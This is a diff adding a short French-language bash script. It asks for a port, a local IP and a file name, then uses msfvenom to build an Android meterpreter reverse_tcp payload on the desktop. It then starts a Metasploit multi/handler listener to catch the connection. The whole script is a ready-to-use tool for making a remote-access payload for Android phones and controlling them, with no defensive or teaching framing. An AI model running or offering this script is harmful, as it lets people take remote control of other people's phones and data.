@@ -1,0 +1,14 @@
+#!/bin/bash
+echo -e "Entrez le port : "
+read -p '> ' lport
+echo -e "Entrez l'IP locale : "
+read -p '> ' lhost
+echo -e "Entrez le nom du fichier : "
+read -p '> ' filename
+echo -e "Génération du fichier $filename sur le bureau, veulliez patienter...\n"
+rm -f ~/Bureau/$filename
+sudo msfvenom -p android/meterpreter/reverse_tcp LPORT=$lport LHOST=$lhost R > ~/Bureau/$filename
+echo -e "Fchier généré"
+echo -e "\nDémmarage de metasploit...\n"
+sudo msfdb init
+sudo msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lport $lport;set lhost $lhost;exploit"
